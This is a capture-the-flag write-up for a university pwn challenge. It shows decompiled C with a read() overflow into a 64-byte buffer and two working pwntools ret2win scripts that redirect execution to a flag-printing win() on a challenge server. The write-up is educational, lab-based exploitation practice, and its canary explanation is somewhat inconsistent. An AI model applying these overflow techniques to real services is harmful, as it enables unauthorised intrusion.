---
title: "UVT CTF – Feedback terminal"
date: 2026-06-03 08:00:00 +0200
categories: [CTF, UVT CTF]
tags: [pwn, binary-exploitation, buffer-overflow, ret2win, canary-bypass, ghidra, pwntools, checksec, no-pie, stack-smashing]
---

## **Challenge Information**
**Title:**  Feedback terminal  
**Category**:  binary exploitation (pwn)  
**Platform:**  UVT CTF (university CTF platform)  
**Difficulty:**    medium  
**Tags:**  pwn, binary-exploitation, buffer-overflow, ret2win, canary-bypass, Ghidra, pwntools, checksec, no-PIE, stack-smashing  
**Date solved:**     03/06/2026 (DD/MM/YYYY)  
**Challenge Description**:  Our feedback terminal is running on the server and accepts user messages over TCP. Something about the way it handles feedback looks unsafe. You are given the same binary that is running remotely. Analyze it, connect to the service and recover the flag.  
**Files provided**:  connection to the server + server executable  

## **Environment and Tools** 
**Operating System**:  Kali Linux  
**Tools/ Software**:  VirtualBox, Ghidra, Terminal, Mozilla, Mousepad  
**Programming Languages (if any)**:  python, bash, c  

## **Recognition Pattern**
- A `vuln()` that reads way more than the buffer holds (`read(0, buffer, 0x100)` into 64 bytes) → buffer overflow
- A `win()` that prints the flag but never gets called → ret2win, overwrite the return address to jump into `win()`
- `checksec` shows a canary, but it turned out to be all null bytes → the canary's there but I can match it with null bytes in the payload
- No PIE → fixed addresses, so I can hardcode `win()`'s address without leaking anything
- `strings` mentioning the FLAG env var and "Here you go" confirmed a flag-printing win function exists in the binary

## **Approach and Methodology**
### **Initial Analysis**
After the first read I knew it had to do with connecting to the server and writing a script — most likely something with bytes and maybe a buffer overflow.  

### **Steps Taken**
I first ran `strings` to see if anything useful was there:

```
@@FLAG
FLAG env var not set
Here you go:
Leave us some feedback:
Thanks for the %zu bytes of feedback!
=== UVT ICS feedback terminal ===
```

Lots of readable text, but this caught my eye — it mentions a flag environment variable and the need to input something. Next I ran `checksec` to see what protections the file has:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
SHSTK:    Enabled
IBT:      Enabled
Stripped: No
```

This tells us there's overflow protection (canary), but the addresses used are fixed. Next I opened Ghidra and analyzed the code.

```c
void vuln(void)
{
    size_t param1;
    char local_48 [64];
    puts("Leave us some feedback:");
    read(0, local_48, 0x100);
    param1 = strlen(local_48);
    printf("Thanks for the %zu bytes of feedback!\n", param1);
    return;
}

void serve(void)
{
    setvbuf((FILE *)stdout, (char *)0x0, 2, 0);
    puts("=== UVT ICS feedback terminal ===");
    vuln();
    puts("Goodbye.");
    return;
}

void win(void)
{
    size_t sVar1;
    char *local_10;
    local_10 = getenv("FLAG");
    if (local_10 == (char *)0x0) {
        local_10 = "FLAG env var not set";
    }
    sVar1 = strlen("Here you go: ");
    write(1, "Here you go: ", sVar1);
    sVar1 = strlen(local_10);
    write(1, local_10, sVar1);
    write(1, &DAT_00480038, 1);
    return;
}
```

The issue: `vuln` reads a much larger buffer than it should, and there's a `win` function that prints the flag but is never called. So I need to send an input larger than the buffer so it overflows, and when `vuln` finishes, redirect execution to the address of `win`.  

To get the address of `win` I ran `nm ./feedback_terminal | grep win`.  

## **Solution and Flag Retrieval**
*Final Exploit / Command Used:*
```
python3 solution.py
```

```python
from pwn import *

HOST = '194.102.62.183'
PORT = 25590
WIN = 0x0000000000401905

# canary is all zeros, confirmed
canary = p64(0x0000000000000000)

# try different RBP padding sizes
for rbp_pad in [8, 16, 4, 0]:
    payload  = b'A' * 64
    payload += canary
    payload += b'B' * rbp_pad
    payload += p64(WIN)

    p = remote(HOST, PORT, level='error')
    p.recvuntil(b'feedback:\n')
    p.send(payload)
    data = p.recvall(timeout=2).decode(errors='ignore')
    print(f"[*] RBP pad {rbp_pad}: {data}")
    p.close()
```

*Update:*  
As I did the ctf again a while later I came up with a different solution, one that does not involve guessing the payload.

```python
from pwn import *

payload= b"A" *72
payload+= p64(0x00401905)

#  nc 194.102.62.183 23235
conn=remote('194.102.62.183',23235)

print(conn.recvuntil(b'Leave us some feedback:'))

conn.sendline(payload)

print(conn.recvall(timeout=2).decode(errors="ignore"))
conn.close()
```

Why payload  is 72 characters?  
```
[local_48buffer:   64 bytes]
[saved RBP:         8 bytes]   => canary found
[return adress:     8 bytes]   => win() adress - see it in Ghidra

=> 64+8=72 random bytes + adress
```

## **Lessons Learned**
- Ret2win: instead of injecting my own code, I redirect execution into a function already in the binary. The payload shape was `padding + canary + saved_RBP + win_address`.
- `nm ./feedback_terminal | grep win` gave me the win address instantly, and with no PIE it's the same every run.
- The canary being all null bytes is what made this exploitable: `read()` doesn't stop at null bytes (unlike `gets()` or `scanf()`), so I could drop `\x00` into the payload to match it.
- I wasn't sure of the exact RBP padding, so I looped over a few sizes (0, 4, 8, 16) instead of calculating it by hand — faster when you're unsure.
- Reading `checksec` first basically told me the attack before I even opened Ghidra: NX enabled + canary pointed at ret2win rather than shellcode.

## **References**
none used
